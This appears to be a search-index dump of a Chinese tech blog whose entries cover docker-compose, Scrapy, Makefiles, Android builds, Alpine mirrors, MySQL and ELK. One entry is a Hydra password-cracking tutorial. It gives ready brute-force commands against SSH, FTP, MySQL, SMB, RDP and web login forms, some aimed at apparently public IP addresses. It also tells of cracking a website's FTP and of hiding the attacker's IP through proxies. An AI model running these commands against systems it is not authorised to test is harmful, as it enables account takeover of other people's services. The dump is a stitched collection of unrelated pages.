postgres\n后者会自动继承 common.yml 中的 webapp 服务及相关环节变量。\n\nnet\n\n设置网络模式。使用和 docker client 的 --net 参数一样的值。\n\nnet: \"bridge\"\nnet: \"none\"\nnet: \"container:[name or id]\"\nnet: \"host\"\n net\nVersion 1 file format only. In version 2, use networkmode.\n为容器指定网络类型，version 1专用，version 2使用networkmode.\nnet: \"bridge\"\nnet: \"host\"\nnet: \"none\"\nnet: \"container:[service name or container name/id]\"\nnetworkmode\nVersion 2 file format only. In version 1, use net.\n为容器指定网络类型.\nnetworkmode: \"bridge\"\nnetworkmode: \"host\"\nnetworkmode: \"none\"\nnetworkmode: \"service:[service name]\"\nnetworkmode: \"container:[container name/id]\"\n networks\n\n    Version 2 file format only. In version 1, use net.\n\nNetworks to join, referencing entries under the top-level networks key.\nservices:\n  some-service:\n    networks:\n     some-network\n     other-network\n\npid\n跟主机系统共享进程命名空间。打开该选项的容器可以相互通过进程 ID 来访问和操作。\n\npid: \"host\"\n\n dns\n\n配置 DNS 服务器。可以是一个值，也可以是一个列表。\n\ndns: 8.8.8.8\ndns:\n  8.8.8.8\n  9.9.9.9\n\ncapadd, capdrop\n添加或放弃容器的 Linux 能力（Capabiliity）。\ncapadd:\n  ALL\n\ncapdrop:\n  NETADMIN\n  SYSADMIN\n\n dnssearch\n\n配置 DNS 搜索域。可以是一个值，也可以是一个列表。\n\ndnssearch: example.com\ndnssearch:\n  domain1.example.com\n  domain2.example.com\n\nworkingdir, entrypoint, user, hostname, domainname, memlimit, privileged, restart, stdinopen, tty, cpushares\n\n这些都是和 docker run 支持的选项类似。\n\ncpushares: 73\n\nworkingdir: /code\nentrypoint: /code/entrypoint.sh\nuser: postgresql\n\nhostname: foo\ndomainname: foo.com\n\nmemlimit: 1000000000\nprivileged: true\n\nrestart: always\n\nstdinopen: true\ntty: true\n`","tags":null},{"location":"//blog.pytool.com/Post/scrapy/2014-05-03-scrapy-Link-Extractors","title":"scrapy Link Extractors","text":"原文地址：http://doc.scrapy.org/en/latest/topics/link-extractors.html\n\nLinkExtractors 对象唯一的目的就是从网页上提取最终会被追踪的链接。\n\nLinkExtractor 只有一个公开的方法 extractlinks，它检索response对象，返回一个scrapy.link.Link对象列表。LinkExtractors 只会被实例化一次，但extractlinks方法会被多次调用，以不同的response。\n\n内建的link extractors\n所有link extractors类都在scrapy.contrib.linkextractors模块里\n\n    from scrapy.contrib.linkextractors import LinkExtractor\n\nLxmlLinkExtractor\nclass scrapy.contrib.linkextractors.lxmlhtml.LxmlLinkExtractor(allow=(), deny=(), allowdomains=(), denydomains=(), denyextensions=None, restrictxpaths=(), tags=('a', 'area'), attrs=('href', ), canonicalize=True, unique=True, processvalue=None)\n\n推荐使用LxmlLinkExtractor，因为它带有易用的筛选选项。它基于lxml的 HTMLParser实现。\n\n参数：\n\n allow一个正则表达式（或一组正则表达式），只有匹配的才能被\n deny\n allowdomains\n denydomains\n denyextensions\n restrictxpaths\n tags\n attrs\n canonicalize\n unique\n processvalue","tags":null},{"location":"//blog.pytool.com/Hacker/2015-03-29 hydra","title":"Hydra 破解登录密码","text":"hydra -L user.txt -P pass.txt -o savessh.log -f -vV -e ns 10.0.5.24 ssh\nhydra -L user.txt -P sup.txt -o savessh.log -f -vV -e ns 113.105.144.130 mysql\nhydra -M list.txt -l root -P dict1000.txt -t 64 -o ssh.txt ssh\n\nHydra 破解登录密码\n\n格式：\n\nhydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e ns] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-f] [-s PORT] [-S] [-vV]\nserver service [OPT] # 可选的\n\n-R 继续从上一次进度接着破解\n-S 采用SSL链接（大写的S）\n-s PORT 如果非默认端口，可通过这个参数指定\n-l LOGIN 小写，用于指定破解的用户，对特定用户破解\n-L FILE 大写，用于指定用户的用户名字典\n-p PASS 小写，用于指定密码破解，少用，一般是采用密码字典\n-P FILE 大写，用于指定密码字典\n-e ns 额外的选项，n：空密码试探，s：使用指定账户和密码试探\n-C FILE 使用冒号分割格式 例如 “登录名:密码”来代替-L/-P参数\n-M FILE 指定目标列表文件一行一条\n-o FILE 指定结果输出文件\n-f 在使用-M参数以后 找到第一对登录名或者密码的时候中止破解\n-t TASKS 同时运行的线程数，默认为16\n-w TIME 设置最大超时的时间，单位秒，默认是30s\n-v / -V 显示详细过程\nserver 目标ip\nservice 指定服务名，支持如下:\ntelnet ftp pop3[-ntlm]\nimap[-ntlm] smb smbnt http[s]-{head|get} http-{get|post}-form http-proxy cisco\ncisco-enable vnc ldap2 ldap3 mssql mysql oracle-listener postgres nntp socks5\nrexec rlogin pcnfs snmp rsh cvs svn icq sapr3 ssh2 smtp-auth[-ntlm] pcanywhere\nteamspeak sip vmauthd firebird ncp afp\n\nOPT 可选项\n\n如何使用代理服务器进行破解（这一点主要处于攻击者的ip，处于自身安全考虑） HYDRAPROXYHTTP 变量参数可以用来定义代理服务器(只能使用http代理) 语法:\n\nHYDRAPROXYHTTP=”http://ip:port/”\nHYDRAPROXYCONNECT=ip:8000\n\n如果你使用的代理需要用户名和密码，请使用HYDRAPROXYAUTH 变量参数:\n\nHYDRAPROXYAUTH=”thelogin:thepassword”\n\n实例破解\n\n1.ftp密码破解 结合自己实例，最近试探一个网站，得到了ftp用户，是serv-u6.02但是无法破解密码，我通过收集这些ftp用户将结果保存在 ftpuser.lst文件中，同时通过收集各个网站的信息，包括管理员的信息组合形成一个密码字典ftppwd.lst。于是，就开始尝试破解，命令如 下：\n\nsudo hydra -L /home/dict/ftpuser.lst -P /home/dict/ftppwd.lst 218.86.103.* ftp\n\n这个是基于多用户密码破解，另外还有一个本地ftp密码破解方案。为了效率我直接将密码写入到pwd.lst字典中\n\nsudo hydra -l administrator -P /home/dict/pwd.lst -v 192.168.8.6 ftp\n\n返回结果如下，成功破解了密码：\n\n该行说明任务总数，会根据你提供用户名和密码进行计算，l:1/p:2表示一个用户名，密码字典中又2个密码\n[DATA] 2 tasks, 1 servers, 2 login tries (l:1/p:2), ~1 tries per task\n[DATA] attacking service ftp on port 21\n[VERBOSE] Resolving addresses … done\n[STATUS] attack finished for 192.168.8.6 (waiting for childs to finish)\n 破解成功，直接显示出来，当然你可以让他输出到文件，通过参数-o设定\n21 host: 192.168.8.6 login: administrator password: 123\n\n通过这种方法有极大可能破解这个ftp，当然关键在于你的字典，我们可以通过字典生成器就可以很好的破解了.\n\n2.samba密码破解 利用nmap扫描到服务器开启了samba服务，于是尝试收集该服务器信息组合成密码字典。由于该应用类似ftp破解，这里不对具体演示，只是将ftp服务改成smb服务即可。\n\n3.网站后台密码破解 该软件的强大之处就在于支持多种协议的破解，同样他也支持对于web用户界面的登录破解，get方式提交的表单比较简单，这里通过post方式提交密码破解提供思路。该工具又一个不好的地方就是，如果目标网站登录时候需要验证码无法破解了。带参数破解如下：\n\nform action=”index.php” method=”POST”\ninput type=”text” name=”name” /BRbr\ninput type=”password” name=”pwd” /brbr\ninput type=”submit” name=”sub” value=”提交”\n\n假设有以上一个密码登录表单，我们执行命令：\n\nsudo hydra -l admin -P pass.lst -o ok.lst -t 1 -f 127.0.0.1 http-post-form “index.php:name=^USER^\u0026pwd=^PASS^:titleinvalido/title”\n\n破解的用户名是admin，密码字典是pass.lst，破解结果保存在ok.lst，-t是同时线程数为1，-f是当破解了一个密码就停止，ip是本 地，就是目标ip，http-post-form表示破解是采用http的post方式提交的表单密码破解后面参数是网页中对应的表单字段的name属 性,后面title中的内容是表示错误猜解的返回信息提示，可以自定义。\n\n总结### 该工具的强大只有你自行体验了，当然密码能否破解关键在于你的字典。以上一些实例操作仅仅是提供的支持的众多服务中的3种，其他的服务也同样非常强大，留给大家自行体会。其实密码字典的生成有相关的工 具，你可以自己生成符合一定规则的密码字典。当然如果你是一个成功的社工专家，往往能够得到事半功倍的效果。\n\n1、破解ssh：\n\nhydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip ssh\nhydra -l 用户名 -p 密码字典 -t 线程 -o save.log -vV ip ssh\n\n2、破解ftp： hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV hydra ip ftp -l 用户名 -P 密码字典 -e ns -vV\n\n3、get方式提交，破解web登录： hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get /admin/ hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get /admin/index.php\n\n4、post方式提交，破解web登录：\n\nhydra -l 用户名 -P 密码字典 -s 80 ip http-post-form \"/admin/login.php:username=^USER^\u0026password=^PASS^\u0026submit=login:sorry password\"\nhydra -t 3 -l admin -P pass.txt -o out.txt -f 10.36.16.18 http-post-form \"login.php:id=^USER^\u0026passwd=^PASS^:titlewrong username or password/title\"\n\n（参数说明：-t同时线程数3，-l用户名是admin，字典pass.txt，保存为out.txt，-f 当破解了一个密码就停止， 10.36.16.18目标ip，http-post-form表示破解是采用http的post方式提交的表单密码破解,title中的内容是表示错误猜解的返回信息提示。）\n\n5、破解https：\n\nhydra -m /index.php -l muts -P pass.txt 10.36.16.18 https\n\n6、破解teamspeak：\n\nhydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak\n\n7、破解cisco：\n\nhydra -P pass.txt 10.36.16.18 cisco\nhydra -m cloud -P pass.txt 10.36.16.18 cisco-enable\n\n8、破解smb：\n\nhydra -l administrator -P pass.txt 10.36.16.18 smb\n\n9、破解pop3：\n\nhydra -l muts -P pass.txt my.pop3.mail pop3\n\n10、破解rdp：\n\nhydra ip rdp -l administrator -P pass.txt -V\n\n11、破解http-proxy：\n\nhydra -l admin -P pass.txt http-proxy://10.36.16.18\n\n12、破解imap：\n\nhydra -L user.txt -p secret 10.36.16.18 imap PLAIN\nhydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAINshot","tags":null},{"location":"//blog.pytool.com/Post/前端技术/meteor/2016-03-29 Meteor项目收集","title":"Meteor","text":"\n\n    http://www.classcraft.com/25\n    https://rocket.chat/42 开源的聊天平台\n    https://wekan.io/19 开源的类 trello 看板工具\n    https://codefights.com/17 编程比赛、学习\n    http://waited.com/6\n    http://www.koantum.com/6\n    http://learntomooch.com/5\n    https://www.thoughtly.co/16 机器学习相关\n    https://hansoftx.com/home/index.html22 团队协作\n    http://www.flowkey.com/en12 学习弹钢琴\n    https://app.versoapp.com/30 教育相关\n    https://respond.ly/4\n    https://lookback.io/5\n    http://blonk.co/6\n\n1、[url]https://github.com/SachaG/Telescope[/url] 一个开放源码的社交新闻应用程序\n2、[url]https://github.com/jonathanKingston/britto[/url] 一个基于meteor的博客系统\n3、[url]https://github.com/chuangbo/meteor-bbs[/url]这是一份对 Project Babel\n3 的克隆，用 Meteor 写成。PB3 是一套非常简洁的社区软件，用coffeescript\n4、[url]https://github.com/snez/jqm-meteor[/url]基于meteor使用UjQuery Mobile\n5、[url]https://github.com/juanpujol/meteor-scrum[/url]scrum开发模式管理\n6、[url]https://github.com/tomblomfield/meteor-chat[/url]简易聊天示例。\n\n传教士VPN\n\nmeteor 常用包 整理","tags":null},{"location":"//blog.pytool.com/Post/Go/golang语言包用法/net_mail","title":"golang中net/mail包用法","text":"---\nchenbaoke的专栏","tags":null},{"location":"//blog.pytool.com/basic/2015-01-29 微信打开外部链接","title":"实现微信浏览器内打开App Store链接","text":"实现微信浏览器内打开App Store链接\n作者: 海蓝 分类: 程序生活 发布时间: 2014-05-09 22:17 ė 被戳了 2,679 次 6 暂无评论\n\n微信浏览器是不支持打开App Store 页面的，不知道微信为什么这么做。比如你页面写 a href=”http://itunes.apple.com/us/app/id399608199″download/a ，在微信浏览器点击链接是没有反应的，但是如果是其他的链接地址，比如百度那就没有问题\n\n后来我发现如果你在微信官方后台编辑图文，把原文链接写为：http://itunes.apple.com/us/app/id399608199 ，那就可以打开了，发现微信页面的“查看原文”是一个function，如下\nCode\n\n真正的url是：http://mp.weixin.qq.com/mp/redirect?url=http%3A%2F%2Fitunes.apple.com%2Fus%2Fapp%2Fid399608199%23rd\n\n看来微信允许打开mp.weixin.qq.com这个host下的网页，然后用js再打开真正的页面。\n\n现在简单了，将页面的代码写为：a href=”http://mp.weixin.qq.com/mp/redirect?url=http%3A%2F%2Fitunes.apple.com%2Fus%2Fapp%2Fid399608199%23rd”download/a，在微信浏览器内可以打开app store的地址了。\n\nhttp://mp.weixin.qq.com/mp/redirect?url=https%3a%2f%2fitunes.apple.com%2fus%2fapp%2fyi-meng-lun-tan%2fid1187128260%3fmt%3d8","tags":null},{"location":"//blog.pytool.com/basic/2016-01-07 GNU Makefile","title":"Makefile常用技巧","text":"target ... : prerequisites ...\n\tcommand\n\ntarget 也就是一个目标文件，可以是 Object File，也可以是执行文件。还可以是一个标签（Label），对于标签这种特性，在后续的“伪目标”章节中会有叙述。\nprerequisites 就是，要生成那个 target 所需要的文件或是目标。\ncommand 也就是 make 需要执行的命令。（任意的 Shell 命令）\ncommand命令 必须要以[Tab]键开始\n\nexportunexport 传递变量到下级 Makefile 中\n\n$@\n表示规则中的目标文件集。在模式规则中，如果有多个目标，那么，\"$@\"就是匹配于\n目标中模式定义的集合。\n$%\n仅当目标是函数库文件中，表示规则中的目标成员名。例如，如果一个目标是\"foo.a\n(bar.o)\"，那么，\"$%\"就是\"bar.o\"，\"$@\"就是\"foo.a\"。如果目标不是函数库文件（Unix\n下是[.a]，Windows 下是[.lib]），那么，其值为空。\n$\u003c\n依赖目标中的第一个目标名字。如果依赖目标是以模式（ 即\"%\"）定义的，那么\"$\u003c\"将\n是符合模式的一系列的文件集。注意，其是一个一个取出来的。\n$?\n所有比目标新的依赖目标的集合。以空格分隔。\n$^\n所有的依赖目标的集合。以空格分隔。如果在依赖目标中有多个重复的，那个这个变量\n会去除重复的依赖目标，只保留一份。\n$+\n这个变量很像\"$^\"，也是所有依赖目标的集合。只是它不去除重复的依赖目标。\n$\n这个变量表示目标模式中\"%\"及其之前的部分。如果目标是\"dir/a.foo.b\"，并且目标的\n模式是\"a.%.b\"，那么，\"$\"的值就是\"dir/a.foo\"。这个变量对于构造有关联的文件名是比\n较有较。如果目标中没有模式的定义，那么\"$\"也就不能被推导出，但是，如果目标文件的\n后缀是 make 所识别的，那么\"$\"就是除了后缀的那一部分。例如：如果目标是\"foo.c\"，因\n为\".c\"是 make 所能识别的后缀名，所以，\"$\"的值就是\"foo\"。这个特性是 GNU make 的，\n\n很有可能不兼容于其它版本的 make，所以，你应该尽量避免使用\"$\"，除非是在隐含规则\n或是静态模式中。如果目标中的后缀是 make 所不能识别的，那么\"$*\"就是空值。","tags":null},{"location":"//blog.pytool.com/Hardware/Android 底层/2016-01-11 Android底层 开发环境搭建","title":"Android开发环境搭建","text":"Android编译系统参考手册\nAndroid 源码下载\nAndroid 编译环境\n常用PPA源\n\n[git]\tapt-add-repository ppa:git-core/ppa\nssh-keygen -t rsa -b 4096 -C \"rinetd@163.com\"\n[java]\tadd-apt-repository ppa:webupd8team/java\n[vim7.3] \tadd-apt-repository ppa:passy/vim\n[python2.7] add-apt-repository ppa:fkrull/deadsnakes\n[cmake 2.8.11] apt-add-repository ppa:roblib/ppa\n##########################################################################\nUbuntu 10.04 64位LTS英文版本\nsudo apt-get install gnupg flex bison gperf build-essential \\\n  zip curl zlib1g-dev libc6-dev lib32ncurses5-dev ia32-libs \\\n  x11proto-core-dev libx11-dev lib32readline5-dev lib32z-dev \\\n  libgl1-mesa-dev g++-multilib mingw32 tofrodos python-markdown \\\n  libxml2-utils xsltproc\n\n1. java-6u45\nsudo add-apt-repository ppa:webupd8team/java\napt-get remove openjdk可以卸载openJDK\n安装sun java6-jdk\nsudo apt-get update\nsudo apt-get install oracle-java6-installer\n\t\t\t\t\t这里安装的是 JDK6, JDK7, JDK8, JDK9 也可以安装，用apt-cache search 查询\n\n sudo apt-get install oracle-java6-set-default\n java -version\n\n补充: 手工设置xxx 为默认的方法，以java 为例：\nupdate-alternatives --config java\nupdate-alternatives --display java\n\t为系统安装新的JAVA\n$ sudo update-alternatives --install /usr/bin/javac javac /usr/lib/jvm/jdk-6u45-linux-x64.bin/bin/javac 1\n$ sudo update-alternatives --install /usr/bin/java java /usr/lib/jvm/jdk-6u45-linux-x64.bin/bin/java 1\n$ sudo update-alternatives --install /usr/bin/javaws javaws /usr/lib/jvm/jdk-6u45-linux-x64.bin/bin/javaws 1\n$ sudo update-alternatives --install /usr/bin/javadoc javadoc /usr/lib/jvm/jdk-6u45-linux-x64.bin/bin/javadoc 1\n$ sudo update-alternatives --install /usr/bin/javah javah /usr/lib/jvm/jdk-6u45-linux-x64.bin/bin/javah 1\n$ sudo update-alternatives --install /usr/bin/javap javap /usr/lib/jvm/jdk-6u45-linux-x64.bin/bin/javap 1\n$ sudo update-alternatives --install /usr/bin/jar jar /usr/lib/jvm/jdk-6u45-linux-x64.bin/bin/jar 1\n\t为系统选择新安装的JAVA版本\n$ sudo update-alternatives --config javac\n$ sudo update-alternatives --config java\n$ sudo update-alternatives --config javaws\n$ sudo update-alternatives --config javadoc\n$ sudo update-alternatives --config javah\n$ sudo update-alternatives --config javap\n$ sudo update-alternatives --config jar\n6.检查JAVA版本\n$ java -version\n7.验证Javac, Java, Javaws, Javadoc, Javah, Javap, Jar是否都指向新的JAVA位置和版本\n$ ls -la /etc/alternatives/java \u0026\u0026 ls -la /etc/alternatives/jar\n\n 2. git 版本过低的错误\n\nfatal:git 1.7.2 or later required\n\n解决方法：增加ppa\nsudo apt-add-repository ppa:git-core/ppa\nsudo apt-get update\nsudo apt-get install git\n如果本地已经安装过Git，可以使用升级命令：\nsudo apt-get dist-upgrade\n\n下载源码镜像\n$ curl https://storage.googleapis.com/git-repo-downloads/repo   ~/repo\n$ chmod a+x ~/repo\nrepo init -u https://aosp.tuna.tsinghua.edu.cn/platform/manifest\n$?=1;   while [ $? -ne 0 ] ; do  repo sync ; done\n\n repo 相关问题\n1.repo sync中遇到error:......checkout ....接一串hashnumber\n解决方法：进到它说提示的目录中，用git status显示文件，将修改过的文件删除掉，再重新repo sync\n2.repo sync中遇到：contains uncommitted changes\n解决方法：进到它说提示的目录中，使用git reset --hard命令\n怎么对repo下的所有project执行git命令\n解决方法：repo forall -c git checkout -b    //该条命令会对repo下的project执行切换branch的命令\n怎么切换到你想要的branch\n解决方法：git checkout branchName，比如 git checkout testBranch\n\n################################################################################\n编译内核\n单独编译kernel : ./buildM120DRETAIL kernel\n单独编译bootloader : ./buildM120DRETAIL aboot\n编译kernel和bootloader : ./buildM120DRETAIL bootimage   boot.img\n单独编译system image: ./buildM120DRETAIL systemimage\n单独编译userdata image: ./buildM120DRETAIL userdataimage\n\nfastboot flash bootloader u-boot.bin\nfastboot flash kernel uImage\nfastboot flash system system.img\nfastboot flash userdata userdata.img\nfastboot flash ramdisk ramdisk-uboot.img\nfastboot erase cache\n\nfastboot flash boot boot.img烧录boot分区\nfastboot flash system system.img烧录system分区\nfastboot flash userdata userdata.img烧录data分区\nadb root\nadb remount\nadb pull remote local\nadb push local remote\nadb reboot recovery\nadb reboot bootloader\nfastboot flashall -w\n\n//烧写kernel\n./buildM120DRETAIL kernel\nadb reboot bootloader\nsudo fastboot flash boot boot.img\nsudo fastboot reboot  \n\n  Android.mk 编译系统\n\nLOCALPATH:= $(call my-dir)\nbuild\\core\\definitions.mk [define my-dir]\n include $(CLEARVARS) #清空除LOCALPATH外的所有环境变量\nbuild\\core\\config.mk[CLEARVARS:= $(BUILDSYSTEM)/clearvars.mk]\n$(BUILDSYSTEM)\nbuild\\core\\main.mk[TOPDIR := , BUILDSYSTEM := $(TOPDIR)build/core ]\n\nAP是application processor\nCP是communication processor,modem那块。\n\n  安装编译好的Android镜像到模拟器上。\n    设置环境变量：\n    USER-NAME@MACHINE-NAME:~/Android$ export PATH=$PATH:~/Android/out/host/linux-x86/bin\n    USER-NAME@MACHINE-NAME:~/Android$ export ANDROIDPRODUCTOUT=~/Android/out/target/product/generic\n    其中，~/Android/out/host/linux-x86/bin有我们要执行的emulator命令，而~/Android/out/target/product/generic是Android镜像存放目录，下面执行emulator命令时会用到。\n    运行模拟器。\n    USER-NAME@MACHINE-NAME:~/Android$ emulator\n    模拟器运行需要四个文件，分别是\n    Linux Kernel镜像zImage\n    Android镜像文件system.img、userdata.img和ramdisk.img。\n    执行emulator命令时，如果不带任何参数，则Linux Kernel镜像默认使用~/Android/prebuilt/android-arm/kernel目录下的kernel-qemu文件，而Android镜像文件则默认使用ANDROIDPRODUCT_OUT目录下的system.img、userdata.img和ramdisk.img，也就是我们刚刚编译出来的镜像问题。\n    当然，我们也可以以指定的镜像文件来运行模拟器，即运行emulator时，即：\n\n    emulator -kernel ./prebuilt/android-arm/kernel/kernel-qemu -sysdir ./out/target/product/generic -system system.img -data userdata.img -ramdisk ramdisk.img\n    到这里，我们就可以在模拟器上运行我们自己编译的Android镜像文件了，是不是很酷呢？但是注意，这里说的Android镜像文件，只是包括system.img、userdata.img和ramdisk.img这三个文件，而Linux Kernel镜像用的是Android为我们预编译好的kernel-qemu镜像。那么，有没有办法使用我们自己编译的Linux Kernel镜像呢？答案上肯定的，这样我们就可以完全DIY自己的Android系统了！我将在下一篇文章描述如果编译自己的Linux Kernel镜像，敬请期待~\n\n搭建easydrawin 视频服务\n在线文档\ngit clone https://github.com/EasyDarwin/EasyDarwin.git\n2.","tags":null},{"location":"//blog.pytool.com/Linux/2010-01-01 alpine常见问题","title":"alpine 技巧","text":"Alpine Linux 源使用帮助 — USTC Mirror Help 文档\n\nAlpine Linux 源使用帮助\n\n地址\n\nhttps://mirrors.ustc.edu.cn/alpine/\nhttp://mirrors.aliyun.com/alpine/\n\nsudo sed -i 's|dl-cdn.alpinelinux.org|mirrors.aliyun.com|g' /etc/apk/repositories\nAlpine Linux 软件源\n\n一般情况下，将 /etc/apk/repositories 文件中 Alpine 默认的源地址 `http://dl-cdn.alpinelinux.org/`\n替换为 `http://mirrors.ustc.edu.cn/` 即可。\n\n可以使用如下命令：\n\n  sed -i 's/dl-cdn.alpinelinux.org/mirrors.ustc.edu.cn/g' /etc/apk/repositories\n\n也可以直接编辑 :file:/etc/apk/repositories 文件。以下是 v3.5 版本的参考配置：\n\n    https://mirrors.ustc.edu.cn/alpine/v3.5/main\n    https://mirrors.ustc.edu.cn/alpine/v3.5/community\n\n也可以使用 `latest-stable` 指向最新的稳定版本：\n\n    https://mirrors.ustc.edu.cn/alpine/latest-stable/main\n    https://mirrors.ustc.edu.cn/alpine/latest-stable/community\n\n更改完 :file:/etc/apk/repositories 文件后请运行 `apk update` 更新索引以生效。\n\n相关链接\n\n:官方主页: https://www.alpinelinux.org/\n:邮件列表: https://lists.alpinelinux.org/\n:论坛: https://forum.alpinelinux.org/forum\n:Wiki: https://wiki.alpinelinux.org/","tags":null},{"location":"//blog.pytool.com/Post/数据库/2017-04-24 mysql视图","title":"mysql视图","text":"show full tables; #查看视图\nSHOW CREATE VIEW vworkloglist\\G; #查看创建视图的SQL语句\n\nselect b.id,b.worklogid,a.status,c.name as username,d.name as category,a.indate,a.updatedate as updatedate,b.comment,\ne.name as organname,f.name as departname,g.name as areaname,\nh1.name as mark0leader,h.score as mark0score,h.comment as mark0comment,h.createdate as mark0date,\nh2.name as mark1leader,i.score as mark1score,i.comment as mark1comment,i.createdate as mark1date\nfrom worklog a\ninner join workloglist b on a.id=b.worklogid\nleft join bususer c on a.userid=c.id\nleft join busclass d on b.classid=d.id\nleft join busorgan e on a.organid=e.id\nleft join busdepartment f on a.departid=f.id\nleft join busarea g on e.areaid=g.id\nleft join workreview h on a.id=h.worklogid and h.sequence=1\nleft join bususer h1 on h.auditorid=h1.id\nleft join workreview i on a.id=i.worklogid and i.sequence=2\nleft join bususer h2 on i.auditorid=h2.id","tags":null},{"location":"//blog.pytool.com/Post/Elastic/2016-10-04 Elastic ELK日志中心分布式架构的逐步演化","title":"ELK日志中心分布式架构的逐步演化","text":"[译] ELK日志中心分布式架构的逐步演化\n\n  摘要：本文属于原创，欢迎转载，转载请保留出处：https://github.com/jasonGeng88/blog\n\n 当前环境\nlogstash：5.2\n\n说明\n记得写 “基于ELK+Filebeat搭建日志中心” 时，有朋友跟我说：“你的日志中心缺少了消息队列。” 是的，没有考虑。因为暂时用不到，架构的演变一定是根据业务的发展逐步完成的。我觉得任何东西，太少或太过都未必是好事。构架能满足公司当前的发展，那就是好的。\n\n当然我不是指架构可以随意设计，只要满足需求就好。我们设计的架构，满足现有需求当然是先决条件，但还得看得到可预见的未来，为架构的演进预留一定的扩展性。\n\n所以架构既得满足公司业务，还要参考一些成熟的方案，不能生搬硬套。这也是我也这篇文章的原因，自知能力有限，要讲分布式我肯定讲不好，其中势必有很多坑。所以借鉴官网原文，给目前或今后要做分布式的同学一点建议（当然也包括我~）。\n\n这里我不会对原文逐字翻译，会根据自己的理解，以我自己能看懂的表述来翻译给大家看。\n\n 原文链接\n\nhttps://www.elastic.co/guide/en/logstash/current/deploying-and-scaling.html#deploying-and-scaling\n\n译文\n\n 概述\n当Logstash的使用场景逐步演进时，我们之前的架构也将随之发生改变。本文讨论了在复杂度逐渐递增下的Logstash架构一系列的演变过程。我们先从一个最简单的架构开始，然后在此架构上来逐渐增加内容。本文的示例是将数据写入到了ES（Elasticsearch）集群，其实Logstash可以写的输出源非常多。\n\n最简架构\nLogstash最简单的架构可以由一个Logstash实例和一个ES实例组成，两者直接相连。按照Logstash的处理流程，我们使用了一个收集数据的INPUT插件和一个数据写入ES的OUTPUT插件，最后按照实例配置文件上的固定配置，启动Logstash。配置文件中，INPUT插件与OUTPUT插件是必须的，且OUTPUT默认输出方式是stdout，FILTER是可选的，下文会讲到。\n\n 引入 Filters\n日志数据默认是无结构化的，经常包含一些无用信息，有时也会丢失一些本可从日志中获取的相关信息。你可以使用FILTER插件来解析你的日志，从中提取有效字段，剔除无用的信息，还可以从有效字段中衍生出额外信息。例如，filters可以从IP地址中衍生出地理信息，将其添加进日志中，也可以使用grok filter解析文本信息，使其结构化。\n\n当然，添加FILTER插件对性能是有一定影响的。这取决于FILTER插件执行的计算量，以及处理的日志大小。grok filter的正则计算尤其占用资源。解决资源消耗大的一种方式是利用计算机多核的特性进行并行计算。使用 -w 参数来设置 Logstash filter 任务的执行线程数。例如，bin/logstash -w 8 命令使用的是8个不同的线程来处理filter。\n\n引入 Filebeat\nFilebeat 是一款有Go语言编写的轻量级日志收集工具，主要作用是收集当前服务器上的日志，并将收集的数据输出到目标机器上进行进一步处理。Filebeat 使用 Beats 协议与Logstash实例进行通信。使用 Beats input 插件 来配置你的Logstash的实例，让其能够接收Beats传来的数据。\n\nFilebeat使用的是源数据所在机器的计算资源，Beats input 插件最小化了Logstash实例的资源需求，这种架构对于有资源限制要求的场景来说，非常有用。\n\n 引入ES集群\n\nLogstash 一般不与ES的单节点进行通信，而是和多个节点组成的ES集群进行通信，采用的协议默认是HTTP。\n\n你可以使用ES提供的REST API接口向集群写入数据，传输的数据格式为JSON。使用REST接口在代码中不需要引入JAVA的客户端类或任何额外的JAR包。相比节点协议与传输格式，没有性能上的弊端。若要做到接口安全通信，可以使用 X-Pack Security ，它支持SSL与HTTP basic的安全校验。\n\n当你使用HTTP协议时，可以在Logstash的 ES output 插件配置中，提供ES集群的多个请求地址，ES的请求将自动做到负载均衡。多个ES节点通过路由流量到活跃节点的方式也为ES集群提供的高可用性。\n\n你也可以使用ES的 JAVA API将数据序列化为二进制后，再进行传输。该协议可以嗅探请求的地址，你可以选择集群中任意的客户端或节点进行通信。\n\n使用HTTP，可以将ES集群与Logstash实例相分离。 与此相反，节点协议把运行Logstash实例的机器作为一个运行中的ES节点，与ES集群连接在了一起。数据同步是将数据从一个节点传输至集群中的其余节点。当该机器作为集群的一部分，该段网络拓扑变得可用，对于使用相对少量持久连接的场景来说，使用节点协议是较合适的。\n\n你也可以使用第三方的负载均衡硬件或软件，来处理Logstash与外部应用的连接。\n\n注意：确保你的Logstash配置不直接连接到ES管理集群的主节点上。将Logstash连接到客户端或数据节点上，来保护ES集群的稳定性。\n\n使用消息队列处理吞吐量峰值\n\n当Logstash接收数据的能力超过了ES集群处理数据的能力时，你可以使用消息队列来作为缓冲。默认情况下，当数据的处理速率低于接收速率，Logstash的接收将产生瓶颈。由于该瓶颈会导致事件在数据源中被缓冲，所以使用消息队列来抗压将成为你架构中的重要环节。\n\n添加一个消息队列到你部署的Logstash中，对数据丢失也提供了一定的保护。当Logstash实例在消息队列中消费数据失败时，数据将会在另一个活跃的Logstash中重新消费。\n\n目前市面上提供的第三方消息队列，如Redis，Kafka，RabbitMQ。Logstash都提供了相应的input、output插件与之做集成。当Logstash的部署中添加了消息队列，Logstash的处理将分为两个阶段：第一阶段（传输实例），负责处理数据采集，并将其存入消息队列；第二阶段（存储实例），从消息队列中获取数据，应用所配置的filter，将处理过的数据写入ES中。\n\n 采用多连接保证Logstash高可用\n\n为了使Logstash架构更适应单节点不可用的情况，，你可以在数据源与Logstash集群间建立负载均衡。这个负载均衡管理与Logstash实例的连接，保证了在单个实例不可用的情况下，数据采集与处理的正常进行。\n\n上面的架构中存在一种问题，每个Logstash实例都只提供一种INPUT。当某一个实例不可用时，该类型的数据将无法继续收集，例如RSS订阅或文件输入。为了使INPUT的处理更健壮，每个Logstash实例都要配置多个input通道，如下图：\n\n该架构基于你配置的INPUT，可以并行工作。对于更多的INPUT输入，你可以增加更多的Logstash实例来进行水平扩展。这也增加了架构的可靠性，消除了单点故障。\n\nLogstash的扩展\n\n一个成熟的Logstash部署有以下几方面：\n\nINPUT层从数据源中采集数据，由合适的input 